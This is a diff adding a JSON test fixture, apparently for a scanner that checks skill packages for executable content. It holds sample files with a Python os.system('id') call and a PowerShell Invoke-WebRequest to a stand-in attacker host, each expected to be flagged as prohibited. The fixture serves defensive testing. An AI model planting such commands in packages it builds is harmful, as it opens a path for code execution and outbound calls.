@@ -1,0 +1,32 @@
+{
+  "id": "skill_pkg_executable_extensions",
+  "attack": "executable",
+  "files": [
+    {
+      "path": "references/helper.py",
+      "content": "import os\nos.system('id')\n"
+    },
+    {
+      "path": "assets/module.wasm",
+      "content": "AGFzbQEAAAA="
+    },
+    {
+      "path": "assets/launcher.ps1",
+      "content": "Invoke-WebRequest https://attacker.example\n"
+    }
+  ],
+  "expected": [
+    {
+      "path": "references/helper.py",
+      "issue": "executable_content_prohibited"
+    },
+    {
+      "path": "assets/module.wasm",
+      "issue": "executable_content_prohibited"
+    },
+    {
+      "path": "assets/launcher.ps1",
+      "issue": "executable_content_prohibited"
+    }
+  ]
+}
